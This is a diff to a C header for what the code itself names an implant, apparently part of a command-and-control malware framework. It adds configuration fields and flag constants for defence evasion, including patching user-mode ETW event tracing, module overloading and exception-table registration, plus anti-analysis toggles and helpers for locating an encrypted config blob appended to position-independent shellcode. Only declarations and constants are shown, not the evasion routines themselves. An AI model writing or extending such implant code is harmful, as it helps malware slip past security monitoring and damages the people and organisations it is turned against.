@@ -17,9 +17,9 @@
 /* ------------------------------------------------------------------ */
 
 /* CONFIG_MAGIC is no longer a compile-time constant.
- * Each build gets a unique per-build magic value patched by the builder
- * into the cfg_magic_marker region. Use cfg_get_magic() at runtime. */
-#define CONFIG_VERSION         1
+ * Each build derives a unique magic value from CRC32(pic_base[0..64]).
+ * Use cfg_get_magic() at runtime. */
+#define CONFIG_VERSION         2
 #define CONFIG_MAX_CHANNELS    4
 #define CONFIG_KEY_INPUT_SIZE  64          /* Bytes of PIC hashed for key */
 #define CONFIG_SCAN_MAX        0x80000     /* 512 KB scan limit         */
@@ -88,6 +88,9 @@ typedef struct _IMPLANT_CONFIG {
     DWORD          checkin_count;      /* Incremented each check-in       */
     DWORD          evasion_flags;      /* Bitmask of enabled evasion mods */
     DWORD          build_flags;        /* Runtime build flags (debug, skip AA) */
+    DWORD          module_overload_rw_offset; /* Build-derived RW split offset */
+    DWORD          pdata_offset;       /* Build-derived RUNTIME_FUNCTION offset */
+    DWORD          pdata_count;        /* Build-derived RUNTIME_FUNCTION count  */
 } IMPLANT_CONFIG;
 
 /* ------------------------------------------------------------------ */
@@ -97,6 +100,9 @@ typedef struct _IMPLANT_CONFIG {
 #define EVASION_FLAG_MODULE_OVERLOAD   0x01
 #define EVASION_FLAG_PDATA_REGISTER    0x02
 #define EVASION_FLAG_NTCONTINUE_ENTRY  0x04
+#define EVASION_FLAG_ETW_USERMODE_PATCH 0x08
+#define EVASION_FLAG_MODULE_PRESERVE_HEADERS 0x10
+#define EVASION_FLAG_MODULE_PATCH_ONLY 0x20
 
 /* ------------------------------------------------------------------ */
 /*  Build flag constants (runtime debug / anti-analysis toggles)       */
@@ -104,6 +110,7 @@ typedef struct _IMPLANT_CONFIG {
 
 #define BUILD_FLAG_DEBUG              0x01
 #define BUILD_FLAG_SKIP_ANTIANALYSIS  0x02
+#define BUILD_FLAG_DISABLE_PROFILE    0x04
 
 /* ------------------------------------------------------------------ */
 /*  Config blob header (appended after PIC binary by build_config.py)  */
@@ -123,10 +130,16 @@ typedef struct _CONFIG_BLOB_HEADER {
 
 /**
  * Return the per-build config magic value.
- * The builder patches this into the cfg_magic_marker region at build time.
  * The implant uses it to locate the config blob and as AEAD AAD.
  */
 DWORD cfg_get_magic(void);
+
+/**
+ * Return the total raw payload span: PIC blob plus appended encrypted config.
+ * This is derived from the appended config header and is safe for flat PIC
+ * loaders because it does not rely on absolute linker-symbol pointers.
+ */
+SIZE_T cfg_get_payload_size(void);
 
 /**
  * Locate config blob appended after PIC, decrypt, parse into
